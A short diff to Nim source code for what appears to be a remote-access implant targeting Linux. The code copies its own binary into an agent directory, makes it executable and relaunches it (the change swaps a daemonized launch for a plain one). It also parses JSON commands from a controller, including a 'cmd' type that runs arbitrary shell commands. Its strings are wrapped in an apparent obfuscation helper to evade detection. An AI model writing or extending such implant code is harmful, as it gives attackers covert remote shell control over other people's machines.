@@ -137,7 +137,7 @@ proc linux_start*(): void =
         createDir(agent_execution_dir)
         copyFile(binary_path, agent_execution_path_linux)
         discard execCmdEx(protectString("chmod +x ") & agent_execution_path_linux)
-        discard startProcess(agent_execution_path_linux, options={poDaemon})
+        discard startProcess(agent_execution_path_linux, options={})
         quit()
     else:
         discard collect_data()
@@ -146,7 +146,6 @@ proc linux_start*(): void =
 proc linux_parse_command*(command: JsonNode): bool =
     var is_success: bool
     var command_type = command[protectString("command_type")].getStr()
-
     case command_type:
         of protectString("cmd"):
             is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
